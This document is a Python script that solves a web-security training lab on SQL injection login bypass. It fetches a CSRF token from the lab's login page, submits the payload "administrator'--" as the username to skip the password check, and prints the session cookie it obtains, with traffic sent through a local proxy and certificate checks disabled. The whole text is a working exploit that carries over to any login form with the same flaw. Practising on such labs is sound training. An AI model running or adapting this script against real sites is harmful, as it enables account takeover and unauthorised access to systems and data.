# Lab: SQL injection vulnerability allowing login bypass

import requests
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

target_url = "https://0a7600650308ca60c0bb2fe200a600c1.web-security-academy.net"

r = requests.Session()
proxies = {
    'https':'http://127.0.0.1:8080',
    'http':'http://127.0.0.1:8080'
}

def get_csrf_token():
    url = target_url + "/login"

    out = r.get(url, proxies=proxies, verify=False)
    if out.status_code == 200:
        soup = BeautifulSoup(out.text,features="html.parser")
        csrf_token = soup.find('input', {'name': 'csrf'}).get('value')

        print("[+] Got the CSRF Token: ", csrf_token)
        return csrf_token

# SQLi to bypass login
def sql_injection(csrf_token):
    url = target_url + "/login"

    payload = "administrator'--"

    data = {
        'csrf':csrf_token,
        'username':payload,
        'password':'random'
    }

    out = r.post(url, data = data, proxies=proxies, verify=False, allow_redirects=False)
    if out.status_code == 302:
        session_cookie = out.headers['Set-Cookie']
        print("[+] Exploited")
        print("[+] Session Cookies is: ", session_cookie)

csrf_token = get_csrf_token()
sql_injection(csrf_token)